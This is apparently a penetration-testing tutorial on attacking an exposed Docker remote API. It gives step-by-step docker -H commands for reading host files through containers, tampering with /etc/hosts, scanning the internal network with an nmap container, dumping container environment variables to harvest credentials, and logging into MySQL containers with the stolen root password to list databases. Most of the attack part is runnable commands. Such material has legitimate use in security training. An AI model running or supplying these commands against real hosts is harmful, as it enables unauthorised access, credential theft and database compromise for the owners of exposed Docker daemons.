After gaining access to the target Docker host, attackers exploit the Docker remote API to launch further attacks, such as mining cryptocurrency, initiating attacks by masking IPs,
creating botnets to perform DoS attacks, installing services for phishing campaigns, retrieving sensitive (e.g., credentials), and compromising the security of the internal network


Retrieving files from the Docker host

Attackers create a new container and mount it to the folder on the Docker host to gain access to other files. 

Run the following command to get an image of Linux alpine: 
$ docker -H <Remote IP:Port> pull alpine

Now, run the following command to create a container from the image:
$ docker -H <Remote IP:Port> run -t -d alpine

After creating the container, run the ls command inside the container to retrieve files stored on the Docker host: 
$ docker -H <Remote IP:Port> exec modest_goldstine ls


Similarly, you can create a container from the image, mount the host ‘/etc’ path to the container, and retrieve the content stored in the ‘/etc/hosts’ file. 
By accessing this file, attackers can make a malicious entry in the host files

Attackers can also access data stored outside the host by identifying mounted volumes to the container. 

You can use the Docker inspect command to detect external storage mounts, such as S3 and network file system (NFS).

Furthermore, if any mount has write access, attackers can manipulate the files stored on the external storage



Scanning internal network

If an attacker creates a container in the existing Docker network bridge, he can access all hosts that the principal Docker host can access within the internal network. 

You can use Nmap to scan the host’s internal network and identify running services:
$ docker -H <docker host> run --network=host --rm marsmensch/nmap -ox <IP Range>



Retrieving credentials

Environment variables are commonly used in Docker for passing credentials as arguments while running the containers. 

Attackers use the Docker inspect command to identify available environment variables on the Docker host.

Executing the “env” command on a container returns all the details, including the credentials used to initiate the containers.

Run the following commands to retrieve credentials:
$ docker -H [docker remote host] inspect [container name] 
$ docker -H [docker remote host] exec -i [container name] env


Querying databases After retrieving credentials, attackers can execute queries on MySQL containers to retrieve sensitive information stored in the database tables. 

Run the following command to find the MySQL containers on the target Docker host:

$ docker -H [docker remote host] ps | grep mysql 

Now, run the following command to retrieve the MySQL credentials:
$ docker -H [docker remote host] exec -i some-mysql env

Use the retrieved credentials to find databases under the MySQL container:
$ docker -H [docker host] exec -i some-mysql mysql -u root -p <password> -e “show databases”




